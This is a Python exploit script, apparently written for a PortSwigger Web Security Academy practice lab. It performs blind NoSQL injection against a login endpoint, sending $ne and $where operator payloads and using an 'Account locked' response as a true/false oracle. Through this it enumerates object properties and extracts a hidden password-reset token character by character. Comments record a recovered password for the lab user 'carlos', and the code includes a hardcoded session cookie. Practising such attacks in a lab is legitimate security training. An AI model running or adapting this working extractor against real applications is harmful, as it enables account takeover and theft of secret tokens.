# https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#

from typing import Callable
import aiohttp
import asyncio

"""
{
"username":"carlos",
"password":{"$regex":"^[A-Z0-9]+$"}
}
"""

# Por esto ya sabemos que tiene una longitud de 20 caracteres
"""
{
"username":"carlos",
"password":{"$regex":"^[a-z0-9]{20}$"}
}
"""

# El objeto me dice que this[0] no sé que es pero this[1] es username y this[2] es password
"""
{"username":"carlos","password":"z0o9jtqj4snacgin51g4",
"$where":"Object.keys(this)[2] == 'password'"
}
"""

MAX_PROPERTY_INDEX = 39
MAX_PROPERTY_LENGTH = 100
POSSIBLE_REGEX = {
    "[a-z]": [chr(x) for x in range(97, 123)], # a-z
    "[a-z_-]": [chr(x) for x in range(97, 123)] + ["_", "-"], # a-z, _, -
    "[A-Z]": [chr(x) for x in range(65, 91)], # A-Z
    "[0-9]": [chr(x) for x in range(48, 58)], # 0-9
    "[a-zA-Z0-9]": [chr(x) for x in range(97, 123)] + [chr(x) for x in range(65, 91)] + [chr(x) for x in range(48, 58)], # a-z, A-Z, 0-9
    "[a-zA-Z0-9_-]": [chr(x) for x in range(97, 123)] + [chr(x) for x in range(65, 91)] + [chr(x) for x in range(48, 58)] + ["_", "-"], # a-z, A-Z, 0-9, _, -
}
REGEX_ALPHABETES = POSSIBLE_REGEX.keys()

MODE_GUESS = "GUESS_PROPERTY_VALUE" # GUESS_PROPERTY_NAME or GUESS_PROPERTY_VALUE
PROPERY_NAME_TO_GUESS = "resetPwdToken"

url =  "https://0ad30099045fb1a7809b081f00a70036.web-security-academy.net:443"
headers = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "es-ES,es;q=0.9", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Sec-Ch-Ua-Mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0a9500f90351517880f60827004200ad.web-security-academy.net/my-account?id=wiener", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}

username = "carlos"
#password = "z0o9jtqj4snacgin51g4"

async def guess_property_name(session, property_index: int, alphabet: list[str], length: int):
    property_name = ""
    for index in range(0, length):
        tasks = []
        for character in alphabet:
            tasks.append(is_property_matches_regex(session,True, property_index, f"^.{{{index}}}{character}"))   
        results = await asyncio.gather(*tasks)
        for result_index, result in enumerate(results):
            if result:
                property_name += alphabet[result_index]
                break
    return property_name

async def guess_property_value(session, property_name: str):
    property_value = ""
    property_value_regex = None
    property_value_length = None
    for temp_regex_alphabet in REGEX_ALPHABETES:
        if await is_property_matches_regex(session, False,None, f"this.{property_name}.match(/^{temp_regex_alphabet}+$/)"):
            #print(f"Regex alphabet: {temp_regex_alphabet}")
            property_value_regex = temp_regex_alphabet
            break
    if property_value_regex is None:
        raise Exception(f"Regex alphabet not found for property {property_name}")
    for temp_length in range(1, 100):
        if await is_property_matches_regex(session,False, None, f"this.{property_name}.match(/^{property_value_regex}{{{temp_length}}}$/)"):
            #print(f"Regex: {property_regex}{temp_length}")
            property_value_length = temp_length
            break
    if property_value_length is None:
        raise Exception(f"Property length not found for property {property_name}")
    print(f"Property {property_name} value regex: {property_value_regex} and length: {property_value_length}")
    for index in range(0, property_value_length):
        tasks = []
        for character in POSSIBLE_REGEX[property_value_regex]:
            tasks.append(is_property_matches_regex(session,False, None, f"this.{property_name}.match(/^.{{{index}}}{character}/)"))   
        results = await asyncio.gather(*tasks)
        for result_index, result in enumerate(results):
            if result:
                property_value += POSSIBLE_REGEX[property_value_regex][result_index]
                break
    return property_value

async def is_properties_count_equal(client: aiohttp.ClientSession, count: int) -> bool:
    cookies = {"session": "7AaDflidEexIzizGDtNWTfiAiHmUlp5b"}
    data_to_inject = {"username": username, "password": {"$ne":""}, "$where": f"Object.keys(this).length == {count}"}
    async with client.post(url + f"/login", headers=headers, cookies=cookies, json=data_to_inject) as response:
        body = await response.text()
        return "Account locked" in body

async def is_property_matches_regex(client: aiohttp.ClientSession, isKey: bool, index: int = None, regex: str= "") -> int:
    cookies = {"session": "7AaDflidEexIzizGDtNWTfiAiHmUlp5b"}
    
    data_to_inject = {"username": username, "password": {"$ne":""}}
    if isKey:
        where = f"Object.keys(this)[{index}].match(/{regex}/)"
        data_to_inject["$where"] = where
    else:
        data_to_inject["$where"] = regex
    print(f"Checking data_to_inject: {data_to_inject}")
    async with client.post(url + f"/login", headers=headers, cookies=cookies, json=data_to_inject) as response:
        if response.status != 200:
            raise Exception(f"Response status not 200 for index {index} and regex {regex}")
        body = await response.text()
        return "Account locked" in body

async def main():
    print ("Quantifying properties count...")
    quantity_of_properties = 0
    async with aiohttp.ClientSession() as session:
        if (MODE_GUESS == "GUESS_PROPERTY_NAME"):
            for property_index in range(1, MAX_PROPERTY_INDEX):
                if await is_properties_count_equal(session, property_index):
                    quantity_of_properties = property_index
                    break
            print(f"Quantity of properties: {quantity_of_properties} ")

            print ("Guessing property regex and length...")
            for property_index in range(0,quantity_of_properties):
                #print(f"-> Guessing property regex and length for index {index}...")
                property_regex = None
                property_length = None
                for temp_regex_alphabet in REGEX_ALPHABETES:
                    if await is_property_matches_regex(session, True,property_index, f"^{temp_regex_alphabet}+$"):
                        #print(f"Regex alphabet: {temp_regex_alphabet}")
                        property_regex = temp_regex_alphabet
                        break
                if property_regex is None:
                    raise Exception(f"Regex alphabet not found for index {property_index}")
                for temp_length in range(1, 100):
                    if await is_property_matches_regex(session,True, property_index, f"^{property_regex}{{{temp_length}}}$"):
                        #print(f"Regex: {property_regex}{temp_length}")
                        property_length = temp_length
                        break
                if property_length is None:
                    raise Exception(f"Property length not found for index {property_index}")
                print(f"Property [{property_index}] regex: {property_regex} and length: {property_length}")
                property_name = await guess_property_name(session, property_index, POSSIBLE_REGEX[property_regex], property_length)
                print(f"Property [index = {property_index}] name: {property_name}")
        if (MODE_GUESS == "GUESS_PROPERTY_VALUE"):
            property_value = await guess_property_value(session, PROPERY_NAME_TO_GUESS)
            print(f"Property [name = {PROPERY_NAME_TO_GUESS}] value: {property_value}")

asyncio.run(main())